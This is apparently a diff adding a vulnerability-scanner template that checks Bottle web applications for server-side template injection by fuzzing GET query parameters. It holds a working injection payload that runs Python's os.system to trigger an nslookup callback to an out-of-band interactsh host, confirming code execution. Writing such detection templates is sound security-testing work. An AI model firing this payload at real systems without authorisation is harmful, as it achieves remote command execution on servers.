@@ -1,0 +1,43 @@
+id: bottle-oob
+
+info:
+  name: Bottle - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://bottlepy.org/docs/dev/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+variables:
+  oast: "{{interactsh-url}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "{{exec('import+os')}}{{exec('os.system(\"nslookup+-type=SRV+{{interactsh-url}}\")')}}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    skip-variables-check: true
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a00473045022100b3c70b176879a2460a518ad7118919a3658bf5806e8bc74b03caf23f1e72433c022077bc6aabdf2008bf051823242155f5bab226fd32d39b7ff9704778a97ecc2dc7:922c64590222798bb761d5b6d8e72950
